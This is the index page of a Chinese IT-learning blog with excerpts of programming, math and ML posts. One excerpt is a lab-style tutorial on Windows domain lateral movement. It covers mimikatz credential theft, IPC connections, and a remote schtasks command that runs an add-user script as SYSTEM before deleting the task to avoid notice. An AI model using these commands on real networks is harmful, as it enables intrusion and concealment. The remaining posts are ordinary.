<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28187b1e9ad4de3d58ef9574d9574603/" rel="bookmark">
			SystemVerilog:always_ff,always_comb,always_latch
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 一、简介二、示例 一、简介 Verilog中只有一个通用的always过程块，SystemVerilog中追加了3个具有更明确目的专用always块。
always_ffalways_combalways_latch always_ff, always_comb, always_latch分别是用于寄存器（flip-flop，代表时序逻辑sequential logic）, 组合逻辑以及锁存器的建模。
事实上，always_ff, always_comb, always_latch能实现的，always都能够实现。
新增的always语句具有如下的特点：
always_comb用于可综合组合逻辑的建模，不需要明确地定义敏感列表。
always_comb与always @(*)在表达组合逻辑时几乎是等价的。always_ff用于可综合时序逻辑的建模，必须带由posedge或者negedge所定义的敏感列表。 可综合设计规则
使用always_comb进行组合逻辑建模，always_comb中使用阻塞赋值；使用always_ff进行时序逻辑建模，always_ff中只能使用非阻塞赋值。只有非阻塞赋值才能正确描述时钟沿触发的同步逻辑行为。同步设计中一般不允许使用latch，因此不要使用always_latch；通用的always只用于testbench的设计；在always_comb/always_ff/always_latch不允许使用时间和事件控制语句；绝对不允许在同一个过程块内混合使用阻塞（=）和非阻塞（&lt;=）两种赋值。组合逻辑和时序逻辑尽量不要在一个过程块中描述。 二、示例 时序逻辑
always_ff @(posedge clk_in or negedge rst_n_in) begin if( !rst_n_in ) begin d &lt;= 'b0; end else begin d &lt;= (a &amp; b) | c; end end 组合逻辑
always_comb begin case(curr_state) s0: begin out1 = 1'b1; out2 = 1'b0; end s1: begin out1 = in1; out2 = 1'b1; end s2: begin out1 = 1'b1; out2 = in2; end default: begin out1 = 1'b0; out2 = 1'b0; end endcase end 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e544a923a8c3467c2e298561beac06c1/" rel="bookmark">
			GitHub提交项目到仓库fatal: No configured push destination.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原因：没指定提交到哪个远程仓库
解决方法：
在你git add .和commit之后
git add . git commit -m "信息" git push前输入以命令
git branch -M main git remote add origin git@github.com:xxx(你GitHub的名称)/xxx.git(你仓库的名称) git push -u origin main 参考：
关于gitee第一次提交出现fatal: No configured push destination. Either specify the URL from the command-line or_either specify the url from the command-line or co-CSDN博客
如何新建Github仓库并将本地文件上传到Github（远程连接）以及Git常用命令总结_github 新建仓库push-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc3bd6b9fa4a589732a261205155598d/" rel="bookmark">
			WPF&#43;Halcon 培训项目实战(1-5):Halcon安装,图像处理,Halcon简单模板匹配
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言相关链接项目专栏我个人对就业市场的评价Halcon安装实战1-4：Halcon基础实战5：模板匹配[形状匹配]实战代码 结尾 前言 为了更好地去学习WPF+Halcon，我决定去报个班学一下。原因无非是想换个工作。相关的教学视频来源于下方的Up主的提供的教程。这里只做笔记分享，想要源码或者教学视频可以和他联系一下。
相关链接 微软系列技术教程 WPF 年度公益课程
Halcon开发 CSDN博客专栏
个人学习的Gitee 项目地址仓库
项目专栏 WPF+Halcon实战项目
我个人对就业市场的评价 前后端： 竞争太激烈：基本是的人都会。技术栈太多：前后端的技术太多了。没有统一。而且技术一直在更新互联网下行：经济下行，互联网缩招，根本没有那么多的岗位生态挤占：Java才是后端的主流，C# 不可能打破Java的垄断地位。 上位机： 技术清晰。语言就两个，[C++]+C#。开发框架就3个，QT+Winfrom/WPF。 QT:C++和跨平台。高性能，开发周期长Winfrom:简单，但是界面比较丑WPF:好看，但是学习成本高。但是WPF在设计之初的时候已经基本完美了，而且基本不再更新，学一次，用一辈子。 目前看看WPF+Halcon我能不能找到工作。哎，不清楚啊。至少能有个10k吧，如果有12K那就更好了。
Halcon安装 halcon-20.11-windows安装教程
实战1-4：Halcon基础 这里就不展开了，可以看我之前的专栏博客
Halcon开发 CSDN博客专栏
实战5：模板匹配[形状匹配] 模板匹配就是找类似的图形。我们可以打开Halcon的教学案例，可以看到有很多的模板匹配案例。这里由于我们只是了解一下模板匹配，这里我们就不展开说明了。
实战代码 测试图片
* 读取文件 read_image (Image, '1.png') dev_close_window () dev_open_window_fit_image (Image, 0, 0, -1, -1, WindowHandle) dev_display (Image) * 选择矩形ROI * 绘制矩形获取参数 draw_rectangle1 (WindowHandle, Row1, Column1, Row2, Column2) * 矩形参数转矩形 gen_rectangle1 (Rectangle, Row1, Column1, Row2, Column2) * 使用矩形截取图形 reduce_domain (Image, Rectangle, ImageReduced) * 重新覆盖图形 dev_display (Image) * 创建匹配模板 * 创建模板文件，默认是弧度制，可以使用rad将度数转弧度,旋转弧度为0-180 create_shape_model (ImageReduced, 'auto', rad(0),rad(180), 'auto', 'auto', 'use_polarity', 'auto', 'auto', ModelID) * 使用模板匹配文件,获取匹配结果数组,旋转弧度为0-180 find_shape_model (Image, ModelID, rad(0),rad(180), 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc3bd6b9fa4a589732a261205155598d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/925d3bb3878680b5ec0a5da2cc765a7c/" rel="bookmark">
			郝斌老师 sql 语句笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、数据库是如何解决数据存储问题的 1 从三个方面来学习数据库 a) 数据库是如何存储的 i. 字段，记录，表，约束 ( 主键，外键，唯一键，非空， check, default, 触发器 ) b) 数据库是如何操作数据的 i. Insert, update, delete, T-SQL, 存储过程，函数， 触发器 c) 数据库是如何显示数据的 i. select( 重点中的重点 ) 必备的一些操作 d) 如何建数据库 i. .mdf 是数据文件 .LDF 是日志文件 ii. 右键 -&gt; 新建数据库 -&gt; 输入名字 -&gt; 确定 e) 如何删除一个库； 如何附加和分离数据库 f) 设置登录用户名和密码； 建用户 用鼠标建立的第一个数据库 Test g) nvarchar() 国际化编码的可变的字符串。 n 表示国际化，对汉字也支持； var 是 变量，字符的长度是可变化的 h) ，其中的 dbo 表示一个系统的身份 i) update emp set emp_id = 1001 j) 存在外键的表叫外键表 k) 当要选择是否可以为空时，用空格键来进行控制，即： 可以用空格来选择 l) PK ， primary 主要的； FK, foreign 外部的 通过 sql 命令建表和主外键约束 m) 在 sql server 里最后一句写不写逗号都可以，但是在 oracle 里不可以写逗号，因此 在写命令时，最后一个字段的后面就不要写逗号了 n) create table dept ( dept_id int primary key, -- 在此处设置了主键 dept_name nvarchar(100) not null , -- 设置了非空 dept_address nvarchar(100) ) create table emp ( -- 这个是注释 emp_id int constraint PK_emp_id_haah primary key, -- 此处给主键起了 -- 一个名字，红字部分可以不写 emp_name nvarchar(20) not null, emp_sex nchar(1), dept_id int constraint FK_dept_id_hd foreign key references dept(dept_id) 2 -- 在此处建立了一个外键，使用了 references ) 约束 o) 约束的分类 i.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/925d3bb3878680b5ec0a5da2cc765a7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad3812f7fb502027809d476a07f84a15/" rel="bookmark">
			Cookie的详解使用（创建，获取，销毁）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Cookie的详解使用（创建，获取，销毁）1、Cookie是什么2、cookie的常用方法3、cookie的构造和获取代码演示SetCookieServlet.javaGetCookieServlet.javaweb.xml运行结果如下 4、Cookie的销毁DestoryCookieServletweb.xml运行结果如下,刚才设置的cookie已经没了 Cookie的详解使用（创建，获取，销毁） 1、Cookie是什么 cookie是在浏览器中保存的
如果想要使用cookie要保证我们的浏览器是开启cookie，所以说有一定的弊端，如果浏览器没有开启cookie，就不能再使用cookie了
cookie的大小是有限制的，通常是4096byte
cookie的保存是以键值对的形式存在的
2、cookie的常用方法 //1.cookie的构造方法，目的是实例化出来cookie对象 Cookie(String name,String value) //2.设置cookie的方法 setValue(String value) //修改cookie的值 getValue(String value) //获得cookie的值 getName(String value) //获得cookie的键 setMaxAge(int time) //设置cookie的有效时间 //3.要将cookie发送到浏览器 response.addCookie(Cookie cookie); //4.获得所有cookie request.getCookies(); 3、cookie的构造和获取代码演示 SetCookieServlet.java /* * Copyright (c) 2020, 2023, fpl1116.cn All rights reserved. * */ package cn.fpl.servlet; import javax.servlet.ServletException; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; /** * &lt;p&gt;Project: JavaWebDemo - SetCookieServlet&lt;/p&gt; * &lt;p&gt;Powered by fpl1116 On 2023-12-27 09:50:33&lt;/p&gt; * &lt;p&gt;描述：&lt;p&gt; * * @author fpl1116 [2391940642@qq.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad3812f7fb502027809d476a07f84a15/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89b013c61591c6bf83bc7c1beb38e5aa/" rel="bookmark">
			文件&amp;IO
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 文章目录
前言
一 . 文件
文件路径
文件类型
Java中操作文件
File 概述
属性
构造方法
方法
createNewFile
mkdir
二 . 文件内容的读写 - IO
InputStream 概述
FileInputStream 概述
利用 Scanner 进行字符读取
OutputStream 概述
PrintWriter封装OutPutStream
三 . 小程序练习
总结
前言 大家好,今天给大家介绍一下文件&amp;IO这方面的内容
一 . 文件 文件是存储在计算机或其他电子设备中的数据集合，可以包含文本、图像、音频、视频等各种形式的信息。文件通常以特定的格式和扩展名来标识其内容和用途，例如.txt、.docx、.jpg、.mp3等。文件可以被创建、编辑、复制、移动、删除等操作，以便在计算机系统中进行管理和使用。
文件路径 如何在文件系统中如何定位我们的一个唯一的文件就成为当前要解决的问题，但这难不倒计算机科学 家，因为从树型结构的角度来看，树中的每个结点都可以被一条从根开始，一直到达的结点的路径所描 述，而这种描述方式就被称为文件的绝对路径（absolute path）。
除了可以从根开始进行路径的描述，我们可以从任意结点出发，进行路径的描述，而这种描述方式就被 称为相对路径（relative path），相对于当前所在结点的一条路径
文件类型 即使是普通文件，根据其保存数据的不同，也经常被分为不同的类型，我们一般简单的划分为文本文件 和二进制文件，分别指代保存被字符集编码的文本和按照标准格式保存的非被字符集编码过的文件。
文本文件 ：文本文件包含的是人类可读的文本内容，通常使用ASCII或Unicode编码。这些文件可以被文本编辑器打开和编辑，如.txt、.doc、.html等。 二进制文件：二进制文件包含的是以二进制形式编码的数据，通常是计算机程序、图像、音频、视频等。这些文件不是以文本形式存储，而是以特定的格式和结构存储数据，通常需要特定的应用程序才能打开和处理。 Java中操作文件 File 概述 我们先来看看 File 类中的常见属性、构造方法和方法
属性 修饰符及类型属性说明static StringpathSeparator依赖于系统的路径分隔符,String 类型的表示static charpathSeparator依赖于系统的路径分隔符,char 类型的表示 构造方法 签名说明File(File parent, String child)根据父目录 + 孩子文件路径，创建一个新的 File 实例File(String pathname)根据文件路径创建一个新的 File 实例，路径可以是绝对路径或者相对路径File(String parent, String child)根据父目录 + 孩子文件路径，创建一个新的 File 实例，父目录用路径表示 方法 返回值类型方法签名说明StringgetParent()返回 File 对象的父目录文件路径StringgetName()返回 FIle 对象的纯文件名称StringgetPath()返回 File 对象的文件路径StringgetAbsolutePath()返回 File 对象的绝对路径StringgetCanonicalPath()返回 File 对象的修饰过的绝对路径booleanexists()判断 File 对象描述的文件是否真实存在booleanisDirectory()判断 File 对象代表的文件是否是一个目录booleanisFile()判断 File 对象代表的文件是否是一个普通文件booleancreateNewFile()根据 File 对象，自动创建一个空文件 成功创建后返回 truebooleandelete()根据 File 对象，删除该文件。成功删除后返回 truevoiddeleteOnExit()根据 File 对象，标注文件将被删除，删除动作会到 JVM 运行结束时才会进行String[]list()返回 File 对象代表的目录下的所有文件名File[]listFiles()返回 File 对象代表的目录下的所有文件，以 File 对象表示booleanmkdir()创建 File 对象代表的目录booleanmkdirs()创建 File 对象代表的目录，如果必要，会创建中间目录booleanrenameTo(File dest)进行文件改名，也可以视为我们平时的剪切、粘贴操作booleancanRead()判断用户是否对文件有可读权限booleancanWrite()判断用户是否对文件有可写权限 把有细节的给大家列举一下,其他的了解就行,用到的时候再查,谁记得住啊!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89b013c61591c6bf83bc7c1beb38e5aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7c6a9a0192fbc9f5cd488e10a6b9544/" rel="bookmark">
			多元函数极值@条件极值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 多元函数条件极值条件极值转为无条件极值 极值必要条件拉格朗日乘数法推广 应用例例 多元函数条件极值 上面所讨论的极值问题,对于函数的自变量,除了限制在函数的定义域内以外,并无其他条件,所以有时候称为无条件极值.但在实际问题中,有时会遇到对函数的自变量还有附加条件的极值问题. 例如,求表面积为a而体积为最大的长方体的体积问题.设长方体的三棱的长为 x , y , z x,y,z x,y,z则体积 V = x y z . V= xyz. V=xyz.又因假定表面积为 a 2 a^2 a2,所以自变量 x , y , z x,y,z x,y,z还必须满足附加条件 2 ( x y + y z + x z ) = a 2 2(xy + yz + xz) = a^2 2(xy+yz+xz)=a2.像这种对自变量有附加条件的极值称为条件极值. 条件极值转为无条件极值 对于有些实际问题,可以把条件极值化为无条件极值,然后利用第一目中的方法加以解决.例如上述问题,可由条件 2 ( x y + y z + x z ) = a 2 2( xy + yz +xz) = a^2 2(xy+yz+xz)=a2,将 z z z表示成(展开合并同类项移项可得) z = a 2 − 2 x y 2 ( x + y ) z=\frac{a^2-2xy}{2(x+y)} z=2(x+y)a2−2xy​,将其代入 V = x y z V=xyz V=xyz,得 V = x y 2 ( a 2 − 2 x y 2 ( x + y ) ) V=\frac{xy}{2}(\frac{a^2-2xy}{2(x+y)}) V=2xy​(2(x+y)a2−2xy​)的无条件极值 极值必要条件 很多情形下,条件极值化为无条件极值不容易,需要寻找新的途径求解条件极值这种方法称为Lagrange乘数法 z = f ( x , y ) z=f(x,y) z=f(x,y)(1)在条件 ϕ ( x , y ) = 0 \phi(x,y)=0 ϕ(x,y)=0(2)下取得极值的必要条件是什么?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7c6a9a0192fbc9f5cd488e10a6b9544/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0e5eeea92c3b1ca60aa616e7a697f65/" rel="bookmark">
			辅助角公式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 三角函数线性组合@辅助角公式👺推导 应用举例 三角函数线性组合@辅助角公式👺 在正弦和余弦波的线性组合的情况下，我们有 a sin ⁡ x + b cos ⁡ x a\sin x+b\cos x asinx+bcosx= a 2 + b 2 ⋅ sin ⁡ ( x + ϕ ) ( a &gt; 0 ) {\sqrt {a^{2}+b^{2}}}\cdot \sin(x+\phi)\;(a&gt;0) a2+b2 ​⋅sin(x+ϕ)(a&gt;0)(0); ϕ = arctan ⁡ ( b a ) \phi=\arctan \left({\frac {b}{a}}\right) ϕ=arctan(ab​)(0-1)或 tan ⁡ ϕ = b a \tan{\phi}=\frac{b}{a} tanϕ=ab​(0-2) 不妨约定其中 ϕ ∈ ( − π 2 , π 2 ) \phi\in(-\frac{\pi}{2},\frac{\pi}{2}) ϕ∈(−2π​,2π​)(0-3), tan ⁡ ϕ \tan{\phi} tanϕ的函数周期为 π \pi π,区间 ( − π 2 , π 2 ) (-\frac{\pi}{2},\frac{\pi}{2}) (−2π​,2π​)恰好是一个周期,这足以使得 tan ⁡ ϕ \tan{\phi} tanϕ取遍所有实数 a sin ⁡ x + b cos ⁡ x a\sin x+b\cos x asinx+bcosx= a 2 + b 2 ⋅ cos ⁡ ( x − ϕ ) ( a &gt; 0 ) {\sqrt {a^{2}+b^{2}}}\cdot \cos(x-\phi)\;(a&gt;0) a2+b2 ​⋅cos(x−ϕ)(a&gt;0);这个公式也叫辅助角公式或李善兰公式。当 a &lt; 0 a&lt;0 a&lt;0时 a sin ⁡ x + b cos ⁡ x a\sin{x}+b\cos{x} asinx+bcosx= − ( − a sin ⁡ x − b cos ⁡ x ) -(-a\sin{x}-b\cos{x}) −(−asinx−bcosx),其中 − a &gt; 0 -a&gt;0 −a&gt;0,就把问题转换为 a &gt; 0 a&gt;0 a&gt;0的情形该公式的主要作用是将多个三角函数的和化成单个函数，以此来求解有关最值问题。 推导 (三角函数两角和公式的使用)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0e5eeea92c3b1ca60aa616e7a697f65/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70bd0d84443a9ed40f3131322db0804c/" rel="bookmark">
			深度学习 | DRNN、BRNN、LSTM、GRU
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、深度循环神经网络 1.1、基本思想
能捕捉数据中更复杂模式并更好地处理长期依赖关系。
深度分层模型比浅层模型更有效率。
Deep RNN比传统RNN表征能力更强。
那么该如何引入深层结构呢？
传统的RNN在每个时间步的迭代都可以分为三个部分：
1.2、三种深层方式 在传统RNN中，这三处都没有中间层，变换函数都是线性变换紧跟着一个非线性函数，也就是所谓的浅层变换。
所以就有三种思路，来看看各个思路的变体：
DT-RNN 这样的好处就是它允许隐变量 ht 适应输入模式 xt 的快速变换，而且它保留了对过去训练的提炼和总结。
既能适应新变换又不忘初心。这种高度非线性转换可以通过若干个 MLP 全连接层（多层感知机）来实现。
DT(S) - RNN 由于DT-RNN增加了Loss的梯度，沿着时间反向传播时需要遍历更多的非线性的步数。
DOT-RNN Stacked RNN 模型比较
DT-RNN 和 Stacked RNN 是正交的：
堆叠的RNN可以出来输入序列中多个时间尺度，而DT-RNN做不到，但是如果将多个DT-RNN堆叠起来，他就可以同时拥有DT-RNN和Stacked RNN 的能力了。
小结
在传统RNN的基础上，增加多个浅变换结构的隐藏层，实现对复杂特征更有效的捕捉和处理。
2、双向循环神经网络 2.1、单向RNN的局限 多数RNN只有一个因果结构；
许多应用中，输出预测可能依赖整个输入序列；
往往需要捕捉序列中上下文之间的关系；
2.2、双向网络结构 —— 两个互相叠加的RNN 输入不仅取决于先前，还取决于未来。
六个权重矩阵。
2.3、训练过程
两遍运算，输入翻转。
2.4、主要特点分析
使用来自序列两端的信息来估计输出；
前向传播需要在双向层中进行，反向传播依赖前向传播结果；
计算速度慢，梯度求解链很长，训练代价高；
主要用于序列编码和双向上下文观测统计。
3、长短期记忆网络 LSTM Long-Short Term Memory
3.1、RNN的问题
处理长序列数据时会有梯度消失或爆炸的问题（权重矩阵连乘）
RNN的计算效率相对较低。
长时间以前的记忆基本对现在没有什么影响了。
3.2、基本思想
保留较长序列数据中重要信息，忽略不重要信息。
RNN都有重复链式结构；
标准RNN结构简单；
LSTM链式结构特殊；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70bd0d84443a9ed40f3131322db0804c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/897a0e6472db9a9aa0a3287da274199d/" rel="bookmark">
			Pandas教程（三）—— 数据清洗与准备
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.处理缺失值 1.1 数据删除函数 作用：删除Dataframe某行或某列的数据 语法：df.drop（ labels = [ ] ）
drop函数的几个参数：
labels =：接收一个列表，内含删除行 / 列的索引编号或索引名
axis =：删除的轴向 0代表删除行；1代表删除列
inplace =：是否改变原数组 默认False 即生成一个新数组
1.2 缺失值的查看 方法 描述
df.isnull（）返回一个布尔数组，是缺失值就显示Truedf.notnull（）返回一个布尔数组，是缺失值就显示False 1.3 过滤缺失值 作用：删除缺失值所在的行 / 列
语法：df.dropna（ axis=0, how='any', thresh=None, subset=None, inplace=False ）
dropna函数的几个参数：
axis =：0代表删除包含缺失值的行；1代表删除包含缺失值的列
how=：“any”代表删除有缺失值的行 / 列 ； “all”代表删除所有值均缺失的行 / 列
thresh=：行 / 列中若达不到thresh个非缺失值，就删除
subset=：输入一个含索引名称的list，代表对这些列的空值进行删除
1.4 填充缺失值 作用：将缺失值补全为指定的值
语法：df.fillna（value, method=None, axis=None, inplace=False, limit=None）
fillna函数的几个参数：
value：填充的值，也可输入一个字典（用于为不同的列设置不同的填充值）
method：填充方法 “ffill”用前面的值填充 “bfill”用后面的值填充
axis：修改填充的轴
limt：最大填充数
2. 数据转换方法 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/897a0e6472db9a9aa0a3287da274199d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f80bf9631a6100b73c67f6431ac253c/" rel="bookmark">
			fpga xvc 调试实现，支持多端口同时调试多颗FPGA芯片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		xilinx 推荐的实现结构方式如下：
通过一个ZYNQ运行xvc服务器，然后通过zynq去配置其他的FPGA，具体参考设计可以参考手册xapp1251，由于XVC运行的协议是标准的TCP协议，这种方式需要ZYNQ运行TCP协议，也就需要运行操作系统，可移植性差；
本方案考虑到XVC协议本身是非常简单的协议，V1.0加一起就3条指令，可以将XVC服务器运行在PC机上，QT直接运行即可，同时QT上位机完成XVC协议栈的数据payload的分发即可，分发协议为了平台移植性强，可以换成UDP协议，将数据分发给一个普通的FPGA，比如A7，A7上只需要实现UDP传输协议，这里设计了一个多端口UDP，设计种设计了10个端口，10个端口占用一个网口，可以做到一个A7同时调试10颗芯片，此外A7需要实现JTAG时序即可；
通过qt可以任意设置JTAG速率；实际测试下来，UDP的效率可以达到96%的效率，同时调试哪怕10台电脑同时调试也完全可以满足，硬件成本大大降低
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ac1771dad7276ed667141888205d625/" rel="bookmark">
			66内网安全-域横向批量at&amp;schtask&amp;impacket
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		域环境下面的传递工具，分为两类。一个是传递一个是漏洞，
传递的第一个协议at&amp;schtask
这里老师给了每一个靶机的账户以及密码，观察一下其规律性，
案例一横向渗透明文传递 at&amp;schtasks 在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息（明文密码或者hash值）后，如何横向渗透拿下更多的主机？
at&amp;schtasks，这两条命令可以在已知的目标系统上面获取到明文密码的基础上，可以直接在目标主机上远程执行命令，
获取某主域主机权限，》利用mimikatz得到密码或者hash值，》用到信息收集里面的域用户的列表当作用户名字典，用到密码明文当密码字典；》尝试连接；》创建计划任务at&amp;schtasks；执行文件可为后门和相关命令
利用流程 简历ipc链接到目标主机
拷贝要执行的命令脚本到目标主机
查看目标时间，创造计划任务（at&amp;schtasks）定时执行把脚本拷贝到目标主机
删除ipc链接
建立 IPC 失败的原因
---（1）目标系统不是NT 或以上的操作系统（win2003以上）
---（2）对方没有打开IPC$共享
---（3）对方未开启139、445 端口，或者被防火墙屏蔽
---（4）输出命令、账号密码有错误 at是针对windwos操作系统版本小于2012的主机
现在我们已经获取到了网站服务器的权限，就是这个webserver，探针到了域控的ip是192.168.3.21
注意；这里不是域控的用户没有办法访问域的有关东西，
假设已经知道了域控的密码，（mimikatz获取，hash等等)；开始渗透
然后我们现在，创建好我们的攻击脚本，这是一个创建用户的命令，这是做测试用到；在实战情况下，这个多半是木马比如msf木马，放上去执行之后就会成功的上线，反弹一个shell过来，
复制文件过去，设置计划任务
25分之后查看域控的用户
这就一个创建出来的小迪用户
schtasks是针对操作系统版本大于等于2012的主机
在操作系统大于2012的主机上，运行这个at就会提示改用schtasks，
先建立ipc链接
之后就是上传文件
建 adduser 任务对应执行文件
schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F
---创建一个以system权限的，名为adduser的，时间为每日任务（延时执行），执行文件c:\add.bat的，计划任务
到执行计划任务时间之后查看
#为了不让对方发现，删除 adduser 任务
--- schtasks /delete /s 192.168.3.32 /tn adduser /f 这个前提条件是获取到了账户的明文密码，但是我们得到的可能不是密码，也可能是hash值，如果我们获得是hash值，上面这两个命令就不能用hash值执行，
案例二横向渗透明文 HASH 传递 impacket 所以我门就会借助一个工具包， impacket ---atexec是Impacket网络协议工具包中的一个工具。Impacket工具包介绍：https://www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ac1771dad7276ed667141888205d625/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86bad434735b198b738db1c8966878fb/" rel="bookmark">
			C1189#error: WinSock.h has already been included解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在做项目移植过程中遇到这个报错，解决了半天。简单记录下解决方案，以供给大家提供一个思路。
原因： 在工程中使用了Boot库之后，使用了socket、tcp相关的头文件，在其他地方还是包括了头文件&lt;windows.h&gt;，该头文件内包含了&lt;winsock.h&gt;。导致遇到报错问题：WinSock.h has already been included
解决方案： 知道问题所在之后，解决办法就好说了，我们把&lt;windows.h&gt;往后移动，放置在你包含boost文件之后，或者直接注释掉即可。问题可以解决，包含顺序的问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a95594e8ee0ab3f78ea6b08227af1997/" rel="bookmark">
			鸿蒙（HarmonyOS）项目方舟框架（ArkUI）之线性布局容器Row组件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		鸿蒙（HarmonyOS）项目方舟框架（ArkUI）之线性布局容器Row组件 一、操作环境 操作系统: Windows 10 专业版、IDE:DevEco Studio 3.1、SDK:HarmonyOS 3.1
二、Row组件 沿水平方向布局容器。
子组件 可以包含子组件。
接口 Row(value?:{space?: string | number})
参数 参数名
参数类型
必填
默认值
参数描述
space
string | number
否
0
横向布局元素间距。
属性 名称
参数类型
默认值
描述
alignItems
VerticalAlign
VerticalAlign.Center
在垂直方向上子组件的对齐格式。
justifyContent8+
FlexAlign
FlexAlign.Start
设置子组件在水平方向上的对齐格式。
三、示例 代码 // xxx.ets @Entry @Component struct RowExample { build() { Column({ space: 5 }) { Text('space').fontSize(9).fontColor(0xCCCCCC).width('90%') Row({ space: 5 }) { Row().width('30%').height(50).backgroundColor("#FF1493") Row().width('30%').height(50).backgroundColor(0x00FFFF) }.width('90%').height(107).border({ width: 1 }) Text('alignItems(Top)').
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a95594e8ee0ab3f78ea6b08227af1997/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35552839fec6b8652c0a89aba19e9864/" rel="bookmark">
			软件测试/测试开发丨Pytest 测试框架学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 自动化测试前，需要提前准备好数据，测试完成后，需要自动清理脏数据，有没有更好用的框架？自动化测试中，需要使用多套测试数据实现用例的参数化，有没有更便捷的方式？自动化测试后，需要自动生成优雅、简洁的测试报告，有没有更好的生成方法 Pytest 背景与优势 Pytest 是什么？ pytest 能够支持简单的单元测试和复杂的功能测试；pytest 可以结合 Requests 实现接口测试； 结合 Selenium、Appium 实现自动化功能测试；使用 pytest 结合 Allure 集成到 Jenkins 中可以实现持续集成。pytest 支持 315 种以上的插件； 为什么要选择 Pytest 丰富的第三方插件
